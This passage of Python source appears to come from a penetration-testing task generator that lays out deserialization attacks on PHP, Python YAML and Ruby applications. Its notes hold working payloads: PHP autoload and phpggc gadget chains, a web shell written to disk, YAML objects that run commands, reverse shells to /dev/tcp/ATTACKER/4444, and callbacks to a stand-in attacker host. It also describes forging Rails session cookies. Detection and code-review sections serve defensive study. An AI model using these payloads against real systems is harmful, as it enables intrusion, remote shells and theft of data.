        require $filename;  // LFI!
    }
});

unserialize($_POST['data']);  // Triggers autoload
```

**Exploitation:**

**Scenario 1: LFI via class name**
Payload: O:10:"tmp_passwd":0:{}
Result: Loads /tmp/passwd.php

**Scenario 2: Load other app's composer loader**
Payload: O:28:"www_frontend_vendor_autoload":0:{}
Result: Loads /www/frontend/vendor/autoload.php
Then can use that app's vulnerable libraries!

**Scenario 3: Chain autoload + gadget**
```php
a:3:{
    s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{};
    s:6:"Extra2";O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:{...RCE gadget...};
    s:6:"Extra3";O:5:"tmp_a":0:{}
}
```
Step 1: Load composer autoloader
Step 2: Use gadget from loaded libraries
Step 3: Load generated payload file

**Detection:**
- Find spl_autoload_register in code
- Check if transforms class names (underscore to slash)
- Test if deserialize() triggers autoload

**Real World Example:**
1. Deserialize loads /var/www/app2/vendor/autoload.php
2. Use phpggc gadget for Guzzle (from app2)
3. Guzzle writes web shell to /tmp/shell.php
4. Deserialize again with class "tmp_shell" to execute
''',
                        'success_indicators': [
                            'Autoload triggered by unserialize',
                            'Arbitrary .php file loaded',
                            'Gadget chain executed from loaded library'
                        ],
                        'failure_indicators': [
                            'Autoload does not process class name',
                            'File path restrictions',
                            'No vulnerable libraries available'
                        ],
                        'next_steps': [
                            'Map autoload logic from source code',
                            'Identify path transformation rules',
                            'Find composer autoloaders on system',
                            'Generate gadget for available libraries',
                            'Chain multiple deserializations'
                        ],
                        'alternatives': [
                            'Direct LFI if file upload available',
                            'phpggc: Generate gadgets for known libraries',
                            'Combine with phar:// for file write + load',
                            'Use session files for arbitrary PHP code'
                        ],
                        'estimated_time': '45-90 minutes'
                    }
                },

                # TASK 3: phpggc gadget chains
                {
                    'id': f'phpggc-gadgets-{port}',
                    'name': 'PHPGGC Gadget Chain Generation',
                    'type': 'command',
                    'metadata': {
                        'command': 'phpggc -l',
                        'description': 'List available PHP gadget chains for popular frameworks',
                        'tags': ['OSCP:HIGH', 'RECON', 'PHP'],
                        'flag_explanations': {
                            '-l': 'List all available gadget chains',
                            'phpggc': 'PHP Generic Gadget Chains tool'
                        },
                        'success_indicators': [
                            'List of gadget chains displayed',
                            'Framework versions shown',
                            'Gadget capabilities listed (RCE, File Write, etc.)'
                        ],
                        'failure_indicators': [
                            'phpggc not installed',
                            'No gadgets for target framework',
                            'Version mismatch'
                        ],
                        'next_steps': [
                            'Identify target framework (Laravel, Symfony, Doctrine)',
                            'Check framework version',
                            'Generate payload: phpggc Laravel/RCE1 system id',
                            'Inject in unserialize() parameter',
                            'URL encode if needed: phpggc -u Laravel/RCE1 system id'
                        ],
                        'alternatives': [
                            'Manual gadget crafting from source code',
                            'Use phar format: phpggc -p phar Laravel/RCE1 system id',
                            'Base64 output: phpggc -b Laravel/RCE1 system id',
                            'Soft URLencode: phpggc -s Laravel/RCE1 system id'
                        ],
                        'notes': '''phpggc provides ready-made gadget chains for popular PHP frameworks.

**Common Frameworks:**
- Laravel/RCE1-7: Laravel framework RCE
- Symfony/RCE1-4: Symfony framework RCE
- Monolog/RCE1-2: Monolog logging library
- Doctrine/RCE1: Doctrine ORM
- Guzzle/FW1: Guzzle HTTP client (file write)
- SwiftMailer/FW1: SwiftMailer (file write)
- Slim/RCE1: Slim framework

**Usage Examples:**

# Generate RCE payload
phpggc Laravel/RCE1 system "curl http://attacker/pwned"

# URL-encoded (for GET parameters)
phpggc -u Laravel/RCE1 system id

# Base64 encoded
phpggc -b Laravel/RCE1 system id

# Phar format (for phar:// exploitation)
phpggc -p phar Laravel/RCE1 system id

# File write (if RCE not available)
phpggc Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET["c"]); ?>'

**Detection Workflow:**
1. Identify PHP framework (error messages, HTTP headers)
2. Find unserialize() in code or test parameters
3. Check phpggc for matching framework
4. Generate and test payload
5. Escalate to shell

**Installation:**
git clone https://github.com/ambionics/phpggc.git
cd phpggc
./phpggc -l
''',
                        'estimated_time': '10-20 minutes'
                    }
                }
            ]
        }

    def _create_python_yaml_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Python YAML deserialization attacks"""
        protocol = 'https' if port in [443, 8443] else 'http'

        return {
            'id': f'python-yaml-deserial-{port}',
            'name': 'Python YAML Deserialization',
            'type': 'parent',
            'children': [
                {
                    'id': f'yaml-detect-{port}',
                    'name': 'Detect YAML Deserialization',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify Python YAML deserialization vulnerabilities',
                        'tags': ['OSCP:MEDIUM', 'PYTHON', 'RECON'],
                        'notes': '''Python YAML libraries can deserialize arbitrary Python objects.

**Vulnerable Patterns:**

1. **yaml.load() without Loader (OLD pyyaml)**
```python
import yaml
data = yaml.load(user_input)  # VULNERABLE
```

2. **yaml.load() with unsafe loaders**
```python
yaml.load(data, Loader=yaml.UnsafeLoader)  # VULNERABLE
yaml.load(data, Loader=yaml.Loader)        # VULNERABLE
yaml.unsafe_load(data)                     # VULNERABLE
```

3. **Safe loaders (NOT vulnerable)**
```python
yaml.safe_load(data)                       # SAFE
yaml.load(data, Loader=yaml.SafeLoader)    # SAFE
```

**Detection:**
- Find YAML parsing in Python apps
- Test endpoints accepting YAML (Content-Type: application/x-yaml)
- Check API documentation for YAML support
- Look for .yml, .yaml file uploads

**Indicators:**
- Flask/Django apps with YAML configs
- REST APIs accepting YAML
- Configuration import features
- Data serialization formats
''',
                        'success_indicators': [
                            'YAML accepted by application',
                            'Python object deserialization confirmed',
                            'Error messages reveal YAML processing'
                        ],
                        'failure_indicators': [
                            'YAML not accepted',
                            'Only safe_load used',
                            'YAML validation blocks objects'
                        ],
                        'next_steps': [
                            'Test basic YAML object: !!python/tuple [1,2,3]',
                            'Test object construction: !!python/object/apply:builtins.range [1,10]',
                            'Craft RCE payload with subprocess',
                            'Inject in all YAML-accepting endpoints'
                        ],
                        'alternatives': [
                            'Test with safe payload first (non-malicious)',
                            'Use YAML syntax validator',
                            'Review source code for yaml.load calls',
                            'Check requirements.txt for PyYAML version'
                        ],
                        'estimated_time': '10-15 minutes'
                    }
                },
                {
                    'id': f'yaml-rce-{port}',
                    'name': 'YAML RCE Payload Generation',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 -c "import yaml; print(yaml.dump(type(\'Evil\',(),{{\'__reduce__\':lambda s:(__import__(\'os\').system,(\'id\',))}})()))"',
                        'description': 'Generate Python YAML deserialization RCE payload',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'PYTHON'],
                        'flag_explanations': {
                            'yaml.dump': 'Serialize Python object to YAML',
                            'type()': 'Create new class dynamically',
                            '__reduce__': 'Special method for pickle/YAML serialization',
                            '__import__': 'Import module dynamically',
                            'os.system': 'Execute OS command'
                        },
                        'success_indicators': [
                            'YAML payload generated',
                            'Command executed on target',
                            'No YAML parsing errors'
                        ],
                        'failure_indicators': [
                            'SafeLoader used (objects blocked)',
                            'Python version incompatibility',
                            'YAML validation rejects payload'
                        ],
                        'next_steps': [
                            'Test simple command first: os.system("id")',
                            'Escalate to reverse shell',
                            'Try subprocess.Popen for more control',
                            'Inject in POST data, file upload, or API'
                        ],
                        'alternatives': [
                            'Use peas.py tool: python3 peas.py (automated payload generator)',
                            'Simple format: !!python/object/apply:os.system ["id"]',
                            'Advanced: !!python/object/apply:subprocess.Popen [["bash","-c","sh -i >& /dev/tcp/ATTACKER/4444 0>&1"]]',
                            'One-liner from HackTricks examples',
                            'ruamel.yaml exploitation (alternative YAML library)'
                        ],
                        'notes': '''Python YAML deserialization RCE payloads.

**Basic RCE Payload:**
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - id

**Reverse Shell Payload:**
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - bash
  - -c
  - bash -i >& /dev/tcp/ATTACKER/4444 0>&1

**Using __reduce__ method:**
```python
import yaml, subprocess

class Payload(object):
    def __reduce__(self):
        return (subprocess.Popen, (['id'],))

print(yaml.dump(Payload()))
```
Output:
!!python/object/apply:subprocess.Popen
- - id

**Advanced: Read files**
!!python/object/new:str
state: !!python/tuple
  - 'print(open("flag.txt").read())'
  - !!python/object/new:Warning
    state:
      update: !!python/name:exec

**Tool: peas.py**
```bash
python3 peas.py
Enter RCE command: cat /etc/passwd
Enter OS [linux/windows]: linux
Want to base64 encode? [N/y]: n
Enter file location: /tmp/payload
Select Module: PyYAML
```

**PyYAML Versions:**
- < 5.1: yaml.load() without Loader is vulnerable
- >= 5.1: Must specify UnsafeLoader explicitly
- All: unsafe_load(), UnsafeLoader always vulnerable

**Detection Methods:**
1. Send safe YAML, check if accepted
2. Send !!python/tuple [1,2], check if deserialized
3. Trigger DNS callback with os.system("nslookup attacker.com")
4. Read error messages for YAML library info

**Common Injection Points:**
- API endpoints (POST /api/config with YAML body)
- File uploads (.yml, .yaml files)
- Configuration imports
- Data export/import features
''',
                        'estimated_time': '15-30 minutes'
                    }
                },
                {
                    'id': f'yaml-old-versions-{port}',
                    'name': 'Exploit Old PyYAML (< 5.1)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit yaml.load() without Loader in PyYAML < 5.1',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'PYTHON'],
                        'notes': '''PyYAML < 5.1 is vulnerable without specifying Loader.

**Vulnerability:**
```python
import yaml
yaml.load(user_input)  # No Loader argument = UnsafeLoader in old versions
```

**One-liner Payload (from HackTricks):**
```yaml
!!python/object/new:str {
  state:
    !!python/tuple [
      'print(exec("print(open(\\"flag.txt\\",\\"r\\").read())"))',
      !!python/object/new:Warning { state: { update: !!python/name:exec  } },
    ],
}
```

**Exploitation:**
1. Detect PyYAML < 5.1 (error messages, documentation)
2. Test yaml.load without Loader
3. Inject RCE payload
4. No Loader specification required!

**This is EASIER than >= 5.1 because no Loader argument needed.**

**Payload Examples:**

**Execute command:**
!!python/object/apply:subprocess.Popen
- ls -la

**Read file:**
!!python/object/new:str
state: !!python/tuple
  - 'print(getattr(open("flag.txt"), "read")())'
  - !!python/object/new:Warning
    state:
      update: !!python/name:exec

**Reverse shell:**
!!python/object/apply:os.system
- bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

**Detection:**
- Check PyYAML version in requirements.txt
- Test yaml.load() without Loader
- Look for python2 apps (more likely old PyYAML)
''',
                        'success_indicators': [
                            'yaml.load() without Loader works',
                            'Payload executed',
                            'PyYAML < 5.1 confirmed'
                        ],
                        'failure_indicators': [
                            'PyYAML >= 5.1 (requires Loader)',
                            'Loader explicitly set to SafeLoader',
                            'YAML library not PyYAML'
                        ],
                        'alternatives': [
                            'If >= 5.1: Must find unsafe_load() or UnsafeLoader usage',
                            'Alternative: ruamel.yaml exploitation',
                            'Try jsonpickle if YAML fails'
                        ],
                        'estimated_time': '10-20 minutes'
                    }
                }
            ]
        }

    def _create_ruby_deserial_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Ruby deserialization attacks"""
        protocol = 'https' if port in [443, 8443] else 'http'

        return {
            'id': f'ruby-deserial-{port}',
            'name': 'Ruby Deserialization',
            'type': 'parent',
            'children': [
                {
                    'id': f'ruby-marshal-{port}',
                    'name': 'Ruby Marshal Deserialization',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit Ruby Marshal.load for RCE',
                        'tags': ['OSCP:MEDIUM', 'RUBY', 'EXPLOIT'],
                        'notes': '''Ruby Marshal allows arbitrary object deserialization.

**Vulnerability:**
```ruby
Marshal.load(user_input)  # DANGEROUS
```

**Marshal Signature:**
Base64: BAhJ (starts with 0x04 0x08 in raw)

**Common Locations:**
- Rails session cookies (signed with secret_key_base)
- Cache systems (Redis, Memcached with Ruby)
- API parameters
- File imports

**Exploitation:**

**1. Find Marshal serialization:**
Look for cookies/data starting with "BAhJ" or raw bytes 0x04 0x08

**2. If Rails session:**
- Extract secret_key_base from:
  - config/secrets.yml
  - Environment variables
  - .git/config if exposed
- Use rails_cookie_decoder to craft malicious session

**3. RCE via Marshal:**
```ruby
# Generate payload (simplified)
payload = Marshal.dump(
  Gem::SpecFetcher.fetcher.instance_variable_get(:@fetcher)
)
# Craft gadget chain for RCE
```

**Rails-specific gadget chains:**
- Gem::SpecFetcher + Gem::RequestSet
- ActiveSupport::Deprecation (old Rails)
- ERB template execution

**Tools:**
- rails_rce: Automated Rails RCE exploitation
- universal-rce: Universal Ruby gadget generator
- metasploit: ruby_marshal_deserialization module
''',
                        'success_indicators': [
                            'Marshal data detected (BAhJ signature)',
                            'secret_key_base found',
                            'RCE achieved via crafted cookie'
                        ],
                        'failure_indicators': [
                            'No Marshal serialization found',
                            'secret_key_base unknown',
                            'Gadget classes not available'
                        ],
                        'next_steps': [
                            'Decode Rails cookie: rails_cookie_decoder',
                            'Find secret_key_base (git, config files)',
                            'Generate RCE payload with gadget chain',
                            'Sign cookie with secret_key_base',
                            'Inject and trigger'
                        ],
                        'alternatives': [
                            'Rails RCE exploit: https://github.com/charliesome/charlie_pwn',
                            'Metasploit module: exploit/multi/http/rails_secret_deserialization',
                            'Manual gadget crafting from Rails source',
                            'JSON pollution if Marshal fails'
                        ],
                        'estimated_time': '30-60 minutes'
                    }
                },
                {
                    'id': f'ruby-json-pollution-{port}',
                    'name': 'Ruby JSON Pollution',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit Ruby JSON gem class pollution',
                        'tags': ['OSCP:LOW', 'RUBY', 'RESEARCH'],
                        'notes': '''Ruby JSON gem can be abused for class pollution / attribute injection.

**Concept:**
Inject JSON with crafted attributes to pollute Ruby object state.

**Example:**
```ruby
# Vulnerable code
user = JSON.parse(params[:data], create_additions: true)
```

**Exploitation:**
Send JSON with "json_class" field to instantiate arbitrary classes:
```json
{
  "json_class": "Gem::SpecFetcher",
  "data": {"...": "..."}
}
```

**Limited Impact:**
- Requires create_additions: true (not default)
- Limited gadget chains
- Class pollution more than direct RCE

**Research-level:**
This is less reliable than Marshal. Use as backup.

**Detection:**
- Check if JSON.parse with create_additions: true
- Test json_class injection
- Look for error messages revealing JSON processing
''',
                        'alternatives': [
                            'Focus on Marshal deserialization (higher impact)',
                            'YAML deserialization in Rails',
                            'Rails mass assignment vulnerabilities'
                        ]
                    }
                }
            ]
        }

    def _create_generic_detection_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Generic deserialization detection across all languages"""
        protocol = 'https' if port in [443, 8443] else 'http'

        return {
            'id': f'generic-deserial-detect-{port}',
            'name': 'Generic Deserialization Detection',
            'type': 'parent',
            'children': [
                {
                    'id': f'magic-bytes-search-{port}',
                    'name': 'Search for Serialization Magic Bytes',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify serialized objects by magic byte signatures',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
                        'notes': '''Common serialization format signatures:

**Java Serialization:**
- Hex: AC ED 00 05
- Base64: rO0AB

**Java Signed Object:**
- Hex: AC ED 00 05 ... (within outer AC ED)
- Context: Nested serialization

**.NET BinaryFormatter:**
- Hex: 00 01 00 00 00 FF FF FF FF
- Base64: AAEAAAD/////

**PHP Serialized:**
- Text: O:8:"ClassName":...
- Pattern: O:<length>:"<name>":<properties>:{...}
- Example: O:4:"User":2:{s:4:"name";s:5:"admin";}

**Python Pickle:**
- Hex: 80 03 (pickle protocol 3)
- Pattern: Various (complex)
- Context: Usually in Python apps

**Ruby Marshal:**
- Hex: 04 08
- Base64: BAhJ

**YAML (with objects):**
- Text: !!python/object/apply:
- Text: !!java/object:

**Where to Look:**
1. **Cookies** - Session cookies often serialized
2. **POST parameters** - "data", "object", "payload", "state"
3. **Hidden fields** - __VIEWSTATE, javax.faces.ViewState
4. **Authorization headers** - Bearer tokens sometimes serialized
5. **File uploads** - Deserialize after upload
6. **API responses** - Check responses for serialized data

**Tools:**
- Burp Suite: Search in all requests/responses
- grep: grep -r "rO0AB\\|AAEAAAD\\|BAhJ" burp_logs/
- xxd: xxd file | grep -i "ac ed 00 05"
- Ysoserial-detector: Automated scanner
''',
                        'success_indicators': [
                            'Serialization magic bytes found',
                            'Format identified (Java, .NET, PHP, etc.)',
                            'Injection point located'
                        ],
                        'failure_indicators': [
                            'No serialization found',
                            'Only safe formats (JSON, plain text)',
                            'Encrypted serialization (need keys)'
                        ],
                        'next_steps': [
                            'Extract and decode serialized object',
                            'Identify language/framework',
                            'Test with safe payload (detection)',
                            'Generate RCE payload if vulnerable',
                            'Inject and exploit'
                        ],
                        'alternatives': [
                            'Automated: Burp plugin "Freddy" for deserialization detection',
                            'GadgetProbe: DNS-based detection',
                            'Manual: Code review for unserialize/deserialize calls',
                            'Dynamic testing: Fuzz parameters with payloads'
                        ],
                        'estimated_time': '10-20 minutes'
                    }
                },
                {
                    'id': f'code-review-deserial-{port}',
                    'name': 'Source Code Review for Deserialization',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Review application source code for insecure deserialization',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'RESEARCH'],
                        'notes': '''Dangerous deserialization patterns to search for in source code:

**Java:**
- ObjectInputStream.readObject()
- XMLDecoder.readObject()
- XStream.fromXML()
- JSON libraries with type handling (Jackson, Gson)
- InitialContext.lookup() with user input (JNDI)

**Search patterns:**
```bash
grep -r "readObject" src/
grep -r "XMLDecoder" src/
grep -r "lookup(" src/ | grep "InitialContext"
grep -r "enableDefaultTyping" src/  # Jackson
```

**.NET:**
- BinaryFormatter.Deserialize()
- LosFormatter.Deserialize()
- SoapFormatter.Deserialize()
- JavaScriptSerializer with type resolver
- Json.NET with TypeNameHandling

**Search patterns:**
```powershell
findstr /s "BinaryFormatter" *.cs
findstr /s "LosFormatter" *.cs
findstr /s "TypeNameHandling" *.cs
```

**PHP:**
- unserialize()
- phar:// stream wrapper
- __wakeup, __destruct, __toString magic methods

**Search patterns:**
```bash
grep -r "unserialize" .
grep -r "phar://" .
grep -r "__wakeup\\|__destruct\\|__toString" .
```

**Python:**
- pickle.loads()
- yaml.load() (without SafeLoader)
- yaml.unsafe_load()
- marshal.loads()
- dill.loads()

**Search patterns:**
```bash
grep -r "pickle.loads\\|yaml.load\\|yaml.unsafe_load" .
grep -r "import pickle\\|import yaml" .
```

**Ruby:**
- Marshal.load()
- YAML.load() (unsafe)
- JSON.parse with create_additions: true

**Search patterns:**
```bash
grep -r "Marshal.load\\|YAML.load" .
grep -r "create_additions.*true" .
```

**Review Checklist:**
1. Find deserialization calls
2. Check if input is user-controlled
3. Identify language/library
4. Look for type resolution (Java/Jackson, .NET)
5. Check for validation/filtering
6. Map input sources to deserialization sinks
''',
                        'success_indicators': [
                            'Unsafe deserialization found in code',
                            'User input flows to deserialize call',
                            'No validation/filtering present'
                        ],
                        'failure_indicators': [
                            'All deserialization uses safe loaders',
                            'Strong input validation present',
                            'Type whitelisting enforced'
                        ],
                        'next_steps': [
                            'Trace data flow from input to deserialization',
                            'Identify available gadget classes',
                            'Test with proof-of-concept payload',
                            'Craft exploitation payload'
                        ],
                        'alternatives': [
                            'Automated SAST tools: SonarQube, Semgrep, CodeQL',
                            'Dependency analysis: Check for vulnerable libraries',
                            'Runtime testing: Dynamic analysis with Burp/ZAP',
                            'Ask developers directly (white box test)'
                        ],
                        'estimated_time': '30-90 minutes (depends on codebase size)'
                    }
                }
            ]
        }
